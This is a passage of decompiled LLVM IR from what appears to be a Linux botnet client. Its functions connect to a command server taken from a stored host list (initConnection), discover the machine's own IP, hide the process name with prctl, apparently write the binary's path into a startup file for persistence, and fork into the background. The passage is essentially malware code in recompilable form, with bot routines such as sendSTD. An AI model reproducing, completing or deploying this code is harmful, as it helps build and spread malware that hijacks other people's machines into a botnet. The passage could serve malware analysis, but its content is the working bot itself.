  uselistorder i1 %v0_804c28a, { 1, 0 }
  uselistorder i1 %v0_804c229, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp119, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 12, 13, 14, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i1* %cf.global-to-local, { 110, 111, 0, 112, 113, 114, 115, 1, 104, 2, 4, 3, 105, 5, 6, 7, 8, 9, 10, 11, 12, 13, 106, 14, 16, 15, 107, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 73, 41, 43, 42, 108, 44, 45, 46, 47, 48, 49, 109, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 98, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 100, 101, 102, 103 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056a31.105 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 1, 0, 2, 3, 4 }
  uselistorder i32* %arg2, { 2, 3, 4, 5, 1, 6, 7, 0, 8, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg1, { 9, 16, 0, 15, 8, 7, 14, 6, 13, 2, 5, 1, 12, 4, 11, 3, 10 }
  uselistorder label %dec_label_pc_804cd5c, { 1, 5, 6, 12, 13, 7, 0, 2, 14, 8, 3, 9, 4, 15, 10, 11, 16 }
  uselistorder label %dec_label_pc_804ccff, { 1, 0 }
  uselistorder label %dec_label_pc_804ccfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cbcc, { 1, 0 }
  uselistorder label %dec_label_pc_804cb52, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cad9, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ca26, { 1, 0 }
  uselistorder label %dec_label_pc_804c9ea, { 1, 0 }
  uselistorder label %dec_label_pc_804c9b9, { 1, 0 }
  uselistorder label %dec_label_pc_804c928, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804c90e, { 1, 0 }
  uselistorder label %dec_label_pc_804c783, { 1, 0 }
  uselistorder label %dec_label_pc_804c747, { 1, 0 }
  uselistorder label %dec_label_pc_804c716, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c64c, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804c53e, { 1, 0 }
  uselistorder label %dec_label_pc_804c32c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd67 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd67, i32* %stack_var_-4, align 4
  %v4_804cd67 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cd67, i32* @ebp, align 4
  %v2_804cd70 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804cd8c = bitcast i32* %stack_var_-4104 to i8*
  %v4_804cd8c = call i32 @__GI_memset(i8* %v3_804cd8c, i32 0, i32 4096)
  %v0_804cd91 = load i32, i32* @global_var_805a6e0.18, align 32
  %v1_804cd96 = icmp eq i32 %v0_804cd91, 0
  br i1 %v1_804cd96, label %dec_label_pc_804cdb1, label %dec_label_pc_804cd9a

dec_label_pc_804cd9a:                             ; preds = %entry
  %v1_804cda2 = call i32 @__libc_close(i32 %v0_804cd91)
  store i32 0, i32* @global_var_805a6e0.18, align 32
  br label %dec_label_pc_804cdb1

dec_label_pc_804cdb1:                             ; preds = %entry, %dec_label_pc_804cd9a
  %v0_804cdb1 = load i32, i32* @global_var_805a378.127, align 8
  %v1_804cdb6 = icmp eq i32 %v0_804cdb1, 0
  %v1_804cdb8 = icmp eq i1 %v1_804cdb6, false
  br i1 %v1_804cdb8, label %dec_label_pc_804cdc6, label %dec_label_pc_804cdd1

dec_label_pc_804cdc6:                             ; preds = %dec_label_pc_804cdb1
  %v1_804cdcb = add i32 %v0_804cdb1, 1
  br label %dec_label_pc_804cdd1

dec_label_pc_804cdd1:                             ; preds = %dec_label_pc_804cdb1, %dec_label_pc_804cdc6
  %storemerge = phi i32 [ %v1_804cdcb, %dec_label_pc_804cdc6 ], [ 0, %dec_label_pc_804cdb1 ]
  store i32 %storemerge, i32* @global_var_805a378.127, align 8
  %v1_804cdd6 = mul i32 %storemerge, 4
  %v2_804cdd6 = add i32 %v1_804cdd6, ptrtoint ([20 x i8]** @global_var_8059750.129 to i32)
  %v3_804cdd6 = inttoptr i32 %v2_804cdd6 to i32*
  %v4_804cdd6 = load i32, i32* %v3_804cdd6, align 4
  store i32 %v4_804cdd6, i32* @eax, align 4
  %v3_804cdea = call i32 @strcpy(i8* %v3_804cd8c, i32 %v4_804cdd6)
  %v3_804ce07 = call i32 @__GI_strchr(i8* %v3_804cd8c, i32 58)
  %v1_804ce0c = icmp eq i32 %v3_804ce07, 0
  br i1 %v1_804ce0c, label %dec_label_pc_804ce4b, label %dec_label_pc_804ce10

dec_label_pc_804ce10:                             ; preds = %dec_label_pc_804cdd1
  %v3_804ce21 = call i32 @__GI_strchr(i8* %v3_804cd8c, i32 58)
  %v1_804ce26 = add i32 %v3_804ce21, 1
  %v1_804ce2a = call i32 @atol(i32 %v1_804ce26)
  %v3_804ce43 = call i32 @__GI_strchr(i8* %v3_804cd8c, i32 58)
  %v4_804ce43 = inttoptr i32 %v3_804ce43 to i8*
  store i8 0, i8* %v4_804ce43, align 1
  br label %dec_label_pc_804ce4b

dec_label_pc_804ce4b:                             ; preds = %dec_label_pc_804cdd1, %dec_label_pc_804ce10
  %stack_var_-8.0 = phi i32 [ 123, %dec_label_pc_804cdd1 ], [ %v1_804ce2a, %dec_label_pc_804ce10 ]
  %v3_804ce62 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804ce62, i32* @global_var_805a6e0.18, align 32
  %v4_804ce8e = call i32 @connectTimeout(i32 %v3_804ce62, i32 %v2_804cd70, i32 %stack_var_-8.0, i32 30)
  %v1_804ce93 = icmp eq i32 %v4_804ce8e, 0
  %. = zext i1 %v1_804ce93 to i32
  %v2_804ceb3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ceb3, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ce4b, { 1, 0 }
  uselistorder label %dec_label_pc_804cdd1, { 1, 0 }
  uselistorder label %dec_label_pc_804cdb1, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ceb5 = load i32, i32* @ebp, align 4
  store i32 %v0_804ceb5, i32* %stack_var_-4, align 4
  %v5_804ced5 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804cedd = icmp eq i32 %v5_804ced5, -1
  %v1_804cee1 = icmp eq i1 %v13_804cedd, false
  br i1 %v1_804cee1, label %dec_label_pc_804cef2, label %dec_label_pc_804d0d0

dec_label_pc_804cef2:                             ; preds = %entry
  %v2_804cef2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804cf1d = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8056c02.130 to i32))
  %v3_804cf2c = call i32 @htons(i16 53)
  %v5_804cf4d = call i32 @__libc_connect(i32 %v5_804ced5, i32 %v2_804cef2, i32 16)
  %v13_804cf55 = icmp eq i32 %v5_804cf4d, -1
  %v1_804cf59 = icmp eq i1 %v13_804cf55, false
  br i1 %v1_804cf59, label %dec_label_pc_804cf6a, label %dec_label_pc_804d0d0

dec_label_pc_804cf6a:                             ; preds = %dec_label_pc_804cef2
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804cf71 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804cf74 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804cf85 = call i32 @__GI_getsockname(i32 %v5_804ced5, i32 %v2_804cf71, i32 %v2_804cf74)
  %v13_804cf8d = icmp eq i32 %v5_804cf85, -1
  %v1_804cf91 = icmp eq i1 %v13_804cf8d, false
  br i1 %v1_804cf91, label %dec_label_pc_804cfa2, label %dec_label_pc_804d0d0

dec_label_pc_804cfa2:                             ; preds = %dec_label_pc_804cf6a
  %v5_804cfb9 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8056c0a.131, i32 0, i32 0), i32 0)
  %v2_804d01e = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804d03634 = call i32 @fdgets(i32 %v2_804d01e, i32 4096, i32 %v5_804cfb9)
  %v1_804d03b35 = icmp eq i32 %v5_804d03634, 0
  %v1_804d03d37 = icmp eq i1 %v1_804d03b35, false
  br i1 %v1_804d03d37, label %dec_label_pc_804cfc3, label %dec_label_pc_804d03f

dec_label_pc_804cfc3:                             ; preds = %dec_label_pc_804cfa2, %dec_label_pc_804cffd
  %v5_804cfd4 = call i32 @strstr(i32 %v2_804d01e, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056c1a.132, i32 0, i32 0))
  %v1_804cfd9 = icmp eq i32 %v5_804cfd4, 0
  br i1 %v1_804cfd9, label %dec_label_pc_804cffd, label %dec_label_pc_804cfeb

dec_label_pc_804cfe8:                             ; preds = %dec_label_pc_804cfeb
  %v4_804cfeb = ptrtoint i8* %storemerge5 to i32
  %v5_804cfe8 = add i32 %v4_804cfeb, 1
  %v22_804cfe8 = inttoptr i32 %v5_804cfe8 to i8*
  br label %dec_label_pc_804cfeb

dec_label_pc_804cfeb:                             ; preds = %dec_label_pc_804cfc3, %dec_label_pc_804cfe8
  %storemerge5 = phi i8* [ %v22_804cfe8, %dec_label_pc_804cfe8 ], [ %stack_var_-4156, %dec_label_pc_804cfc3 ]
  %v2_804cfee = load i8, i8* %storemerge5, align 1
  %v10_804cff1 = icmp eq i8 %v2_804cfee, 9
  %v1_804cff3 = icmp eq i1 %v10_804cff1, false
  br i1 %v1_804cff3, label %dec_label_pc_804cfe8, label %dec_label_pc_804cff5

dec_label_pc_804cff5:                             ; preds = %dec_label_pc_804cfeb
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_804d03f

dec_label_pc_804cffd:                             ; preds = %dec_label_pc_804cfc3
  %v6_804d019 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804d036 = call i32 @fdgets(i32 %v2_804d01e, i32 4096, i32 %v5_804cfb9)
  %v1_804d03b = icmp eq i32 %v5_804d036, 0
  %v1_804d03d = icmp eq i1 %v1_804d03b, false
  br i1 %v1_804d03d, label %dec_label_pc_804cfc3, label %dec_label_pc_804d03f

dec_label_pc_804d03f:                             ; preds = %dec_label_pc_804cfa2, %dec_label_pc_804cffd, %dec_label_pc_804cff5
  %v2_804d045 = call i32 @__libc_close(i32 %v5_804cfb9)
  %v3_804d04a = load i8, i8* %stack_var_-4156, align 1
  %v4_804d051 = icmp eq i8 %v3_804d04a, 0
  br i1 %v4_804d051, label %dec_label_pc_804d0b7, label %dec_label_pc_804d055

dec_label_pc_804d055:                             ; preds = %dec_label_pc_804d03f
  %v2_804d05f = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804d05f, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804d068 = call i32 @strcpy(i8* %tmp32, i32 %v2_804d01e)
  %v5_804d085 = call i32 @ioctl(i32 %v5_804ced5, i32 35111, i32 %v2_804d05f)
  %v2_804d09c = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804d093

dec_label_pc_804d093:                             ; preds = %dec_label_pc_804d055, %dec_label_pc_804d093
  %storemerge33 = phi i32 [ 0, %dec_label_pc_804d055 ], [ %v4_804d0ae, %dec_label_pc_804d093 ]
  %v2_804d0a2 = add i32 %storemerge33, %v2_804d09c
  %v1_804d0a5 = inttoptr i32 %v2_804d0a2 to i8*
  %v2_804d0a5 = load i8, i8* %v1_804d0a5, align 1
  %v3_804d0a8 = add i32 %storemerge33, ptrtoint (i8** @global_var_805a6f0.133 to i32)
  %v4_804d0a8 = inttoptr i32 %v3_804d0a8 to i8*
  store i8 %v2_804d0a5, i8* %v4_804d0a8, align 1
  %v4_804d0ae = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_804d0ae, 6
  br i1 %exitcond, label %dec_label_pc_804d0b7, label %dec_label_pc_804d093

dec_label_pc_804d0b7:                             ; preds = %dec_label_pc_804d093, %dec_label_pc_804d03f
  %v2_804d0bd = call i32 @__libc_close(i32 %v5_804ced5)
  br label %dec_label_pc_804d0d0

dec_label_pc_804d0d0:                             ; preds = %entry, %dec_label_pc_804cef2, %dec_label_pc_804cf6a, %dec_label_pc_804d0b7
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_804d0b7 ], [ 0, %dec_label_pc_804cf6a ], [ 0, %dec_label_pc_804cef2 ], [ 0, %entry ]
  %v2_804d0d6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d0d6, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_804d01e, { 1, 3, 2, 0 }
  uselistorder i32 %v5_804cfb9, { 1, 2, 0 }
  uselistorder i32 %v5_804ced5, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 8, 1, 2, 3, 4, 5, 6, 0, 7, 9, 10, 11 }
  uselistorder label %dec_label_pc_804d0d0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d093, { 1, 0 }
  uselistorder label %dec_label_pc_804d03f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cfeb, { 1, 0 }
  uselistorder label %dec_label_pc_804cfc3, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8056c25.134 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804d0e2 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804d0e2, i32* %stack_var_-24, align 4
  %v5_804d0f3 = icmp ult i32* %stack_var_-24, inttoptr (i32 5864 to i32*)
  store i1 %v5_804d0f3, i1* %cf.global-to-local, align 1
  %v1_804d10c = add i32 %v2_804d0e2, 4
  %v2_804d10c = inttoptr i32 %v1_804d10c to i32*
  %v3_804d10c = load i32, i32* %v2_804d10c, align 4
  %v1_804d10f = inttoptr i32 %v3_804d10c to i32*
  %v2_804d10f = load i32, i32* %v1_804d10f, align 4
  store i1 false, i1* @df, align 1
  %v4_804d11f = inttoptr i32 %v2_804d10f to i8*
  store i32 %v2_804d10f, i32* @edi, align 4
  %v3_804d125 = call i32 @_strlen(i8* %v4_804d11f)
  %v3_804d134 = load i32, i32* %v2_804d10c, align 4
  %v1_804d137 = inttoptr i32 %v3_804d134 to i32*
  %v2_804d137 = load i32, i32* %v1_804d137, align 4
  store i32 %v2_804d137, i32* %stack_var_-5888, align 4
  %v4_804d148 = inttoptr i32 %v2_804d137 to i8*
  %v5_804d148 = call i32 @strncpy(i8* %v4_804d148, i32 ptrtoint (i32* @global_var_8056c2c.135 to i32), i32 %v3_804d125)
  store i32 %v2_804d0e2, i32* @esi, align 4
  %v3_804d158 = load i32, i32* %v2_804d10c, align 4
  %v2_804d15b = inttoptr i32 %v3_804d158 to i32*
  store i32 ptrtoint (i32* @global_var_8056c2c.135 to i32), i32* %v2_804d15b, align 4
  store i32 15, i32* %stack_var_-5888, align 4
  %v6_804d183 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8056c2c.135 to i32), i32 0, i32 0, i32 0)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804d18f = call i32 @__GI_time(i32* null)
  store i32 %v2_804d18f, i32* @ebx, align 4
  %v0_804d196 = call i32 @__libc_getpid()
  %v1_804d19b = load i32, i32* @ebx, align 4
  %v2_804d19b = xor i32 %v1_804d19b, %v0_804d196
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d19b, i32* @eax, align 4
  store i32 %v2_804d19b, i32* %stack_var_-5888, align 4
  %v1_804d1a0 = call i32 @srand(i32 %v2_804d19b)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804d1ac = call i32 @__GI_time(i32* null)
  store i32 %v2_804d1ac, i32* @ebx, align 4
  %v0_804d1b3 = call i32 @__libc_getpid()
  %v1_804d1b8 = load i32, i32* @ebx, align 4
  %v2_804d1b8 = xor i32 %v1_804d1b8, %v0_804d1b3
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d1b8, i32* %stack_var_-5888, align 4
  %v1_804d1bd = call i32 @init_rand(i32 %v2_804d1b8)
  store i32 ptrtoint ([19 x i8]* @global_var_8056c2d.136 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_8056c2d.136 to i32), i32* %stack_var_-5888, align 4
  %v3_804d1de = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8056c2d.136 to i32), i32 ptrtoint ([2 x i8]* @global_var_8056c40.137 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d1e6 = icmp eq i32 %v3_804d1de, 0
  %v1_804d1ea = icmp eq i1 %v4_804d1e6, false
  br i1 %v1_804d1ea, label %dec_label_pc_804d209, label %dec_label_pc_804d1ec

dec_label_pc_804d1ec:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_8056c42.138 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_8056c42.138 to i32), i32* %stack_var_-5888, align 4
  %v3_804d201 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8056c42.138 to i32), i32 ptrtoint ([2 x i8]* @global_var_8056c40.137 to i32))
  br label %dec_label_pc_804d209

dec_label_pc_804d209:                             ; preds = %entry, %dec_label_pc_804d1ec
  %stack_var_-88.0 = phi i32 [ %v3_804d1de, %entry ], [ %v3_804d201, %dec_label_pc_804d1ec ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8056c2d.136, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8056c42.138, i32 0, i32 0), %dec_label_pc_804d1ec ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d209 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804d209, label %dec_label_pc_804d3ab, label %dec_label_pc_804d213

dec_label_pc_804d213:                             ; preds = %dec_label_pc_804d209
  %v3_804d219 = load i32, i32* %v2_804d10c, align 4
  %v1_804d21c = inttoptr i32 %v3_804d219 to i32*
  %v2_804d21c = load i32, i32* %v1_804d21c, align 4
  store i1 false, i1* @df, align 1
  %v4_804d22c = inttoptr i32 %v2_804d21c to i8*
  store i32 %v2_804d21c, i32* @edi, align 4
  %v3_804d232 = call i32 @_strlen(i8* %v4_804d22c)
  %v2_804d24b = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804d24b, i32* %stack_var_-5888, align 4
  %v3_804d254 = call i32 @getcwd(i32 %v2_804d24b, i32 256)
  store i1 false, i1* @df, align 1
  %v4_804d27a = bitcast i32* %stack_var_-368 to i8*
  store i32 %v2_804d24b, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8056c4f.139 to i32), i32* @edi, align 4
  %v7_804d28c = call i32 @_strncmp(i8* %v4_804d27a, i8* bitcast (i8** @global_var_8056c4f.139 to i8*), i32 2)
  %v8_804d28c = urem i32 %v7_804d28c, 2
  %v9_804d28c = icmp eq i32 %v8_804d28c, 0
  %v0_804d28e = load i1, i1* @cf, align 1
  %v2_804d28e = or i1 %v0_804d28e, %v9_804d28c
  %v3_804d28e = zext i1 %v2_804d28e to i8
  %v7_804d28e = xor i8 %v3_804d28e, 1
  %v5_804d291 = ptrtoint i32* %stack_var_-512 to i32
  %v3_804d294 = and i32 %v7_804d28c, -256
  %v3_804d296 = trunc i32 %v5_804d291 to i8
  %v4_804d296 = sub i8 %v7_804d28e, %v3_804d296
  %v15_804d296 = icmp eq i8 %v4_804d296, 0
  %v20_804d296 = zext i8 %v4_804d296 to i32
  %v23_804d296 = or i32 %v20_804d296, %v3_804d294
  store i32 %v23_804d296, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804d296, label %dec_label_pc_804d3a0, label %dec_label_pc_804d2aa

dec_label_pc_804d2a7:                             ; preds = %dec_label_pc_804d2aa
  %v4_804d2a7 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804d2aa

dec_label_pc_804d2aa:                             ; preds = %dec_label_pc_804d213, %dec_label_pc_804d2a7
  %stack_var_-84.0 = phi i32 [ %v4_804d2a7, %dec_label_pc_804d2a7 ], [ %v3_804d232, %dec_label_pc_804d213 ]
  store i32 %v2_804d0e2, i32* @esi, align 4
  %v3_804d2b0 = load i32, i32* %v2_804d10c, align 4
  %v1_804d2b3 = inttoptr i32 %v3_804d2b0 to i32*
  %v2_804d2b3 = load i32, i32* %v1_804d2b3, align 4
  %v2_804d2b8 = add i32 %v2_804d2b3, %stack_var_-84.0
  %v1_804d2bb = inttoptr i32 %v2_804d2b8 to i8*
  %v2_804d2bb = load i8, i8* %v1_804d2bb, align 1
  %v6_804d2be = icmp ult i8 %v2_804d2bb, 47
  store i1 %v6_804d2be, i1* %cf.global-to-local, align 1
  %v10_804d2be = icmp eq i8 %v2_804d2bb, 47
  %v1_804d2c0 = icmp eq i1 %v10_804d2be, false
  br i1 %v1_804d2c0, label %dec_label_pc_804d2a7, label %dec_label_pc_804d2c2

dec_label_pc_804d2c2:                             ; preds = %dec_label_pc_804d2aa
  store i32 %v2_804d0e2, i32* @edi, align 4
  %v3_804d2c8 = load i32, i32* %v2_804d10c, align 4
  %v1_804d2cb = inttoptr i32 %v3_804d2c8 to i32*
  %v2_804d2cb = load i32, i32* %v1_804d2cb, align 4
  %v2_804d2d0 = add i32 %v2_804d2cb, %stack_var_-84.0
  %v2_804d2e9 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804d2e9, i32* %stack_var_-5888, align 4
  %v5_804d2f2 = call i32 @sprintf(i32 %v2_804d2e9, i32 ptrtoint ([8 x i8]* @global_var_8056c51.140 to i32), i32 %v2_804d24b, i32 %v2_804d2d0)
  %v1_804d33b = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804d308 = ptrtoint i32* %stack_var_-1648 to i32
  %v3_804d329 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_804d335.outer

dec_label_pc_804d2f9:                             ; preds = %dec_label_pc_804d335
  store i32 %v2_804d308, i32* %stack_var_-5888, align 4
  %v4_804d311 = call i32 @fgets(i32 %v2_804d308, i32 1024, i32 %stack_var_-88.0)
  store i32 %v2_804d308, i32* %stack_var_-5888, align 4
  %v4_804d329 = call i32 @__GI_strcasecmp(i8* %v3_804d329, i32 %v2_804d2e9)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d32e = icmp eq i32 %v4_804d329, 0
  %v1_804d330 = icmp eq i1 %v1_804d32e, false
  br i1 %v1_804d330, label %dec_label_pc_804d335, label %dec_label_pc_804d332

dec_label_pc_804d332:                             ; preds = %dec_label_pc_804d2f9
  %v4_804d332 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804d335.outer

dec_label_pc_804d335.outer:                       ; preds = %dec_label_pc_804d332, %dec_label_pc_804d2c2
  %stack_var_-80.0.ph = phi i32 [ %v4_804d332, %dec_label_pc_804d332 ], [ 0, %dec_label_pc_804d2c2 ]
  br label %dec_label_pc_804d335

dec_label_pc_804d335:                             ; preds = %dec_label_pc_804d335.outer, %dec_label_pc_804d2f9
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804d33b = call i32 @feof(i16* %v1_804d33b)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d340 = icmp eq i32 %v2_804d33b, 0
  br i1 %v1_804d340, label %dec_label_pc_804d2f9, label %dec_label_pc_804d344

dec_label_pc_804d344:                             ; preds = %dec_label_pc_804d335
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d344 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804d348 = icmp eq i1 %v4_804d344, false
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804d399 = call i32 @__GI_fclose(i16* %v1_804d33b)
  br i1 %v1_804d348, label %dec_label_pc_804d3ab, label %dec_label_pc_804d34a

dec_label_pc_804d34a:                             ; preds = %dec_label_pc_804d344
  %v4_804d35d = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_804d35d, i32* @eax, align 4
  store i32 %v4_804d35d, i32* %stack_var_-5888, align 4
  %v3_804d363 = call i32 @__GI_fopen(i32 %v4_804d35d, i32 ptrtoint (i32* @global_var_8056c59.141 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d36b = icmp eq i32 %v3_804d363, 0
  br i1 %v4_804d36b, label %dec_label_pc_804d3ab, label %dec_label_pc_804d371

dec_label_pc_804d371:                             ; preds = %dec_label_pc_804d34a
  store i32 %v2_804d2e9, i32* %stack_var_-5888, align 4
  %v3_804d381 = call i32 @__GI_fputs(i32 %v2_804d2e9, i32 %v3_804d363)
  store i32 %v3_804d363, i32* @eax, align 4
  store i32 %v3_804d363, i32* %stack_var_-5888, align 4
  %v1_804d38c = inttoptr i32 %v3_804d363 to i16*
  %v2_804d38c = call i32 @__GI_fclose(i16* %v1_804d38c)
  br label %dec_label_pc_804d3ab

dec_label_pc_804d3a0:                             ; preds = %dec_label_pc_804d213
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v1_804d3a6 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804d3a6 = call i32 @__GI_fclose(i16* %v1_804d3a6)
  br label %dec_label_pc_804d3ab

dec_label_pc_804d3ab:                             ; preds = %dec_label_pc_804d344, %dec_label_pc_804d34a, %dec_label_pc_804d209, %dec_label_pc_804d371, %dec_label_pc_804d3a0
  %v0_804d3ab = call i32 @getOurIP()
  %v0_804d3b0 = load i32, i32* %stack_var_-5888, align 4
  %v1_804d3b0 = call i32 @__libc_fork(i32 %v0_804d3b0)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3b8 = icmp eq i32 %v1_804d3b0, 0
  br i1 %v4_804d3b8, label %dec_label_pc_804d3ea, label %dec_label_pc_804d419

dec_label_pc_804d3ea:                             ; preds = %dec_label_pc_804d3ab
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d3ea = load i32, i32* %stack_var_-5888, align 4
  %v1_804d3ea = call i32 @__libc_fork(i32 %v0_804d3ea)
  store i32 %v1_804d3ea, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3f2 = icmp eq i32 %v1_804d3ea, 0
  br i1 %v4_804d3f2, label %dec_label_pc_804d404.thread, label %dec_label_pc_804d40a

dec_label_pc_804d404.thread:                      ; preds = %dec_label_pc_804d3ea
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d426

dec_label_pc_804d40a:                             ; preds = %dec_label_pc_804d3ea
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d3ff = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8056c5b.142 to i32), i32* %stack_var_-5888, align 4
  %v1_804d412 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8056c5b.142 to i32))
  br label %dec_label_pc_804d426

dec_label_pc_804d419:                             ; preds = %dec_label_pc_804d3ab
  %v2_804d3c6 = ptrtoint i32* %stack_var_-112 to i32
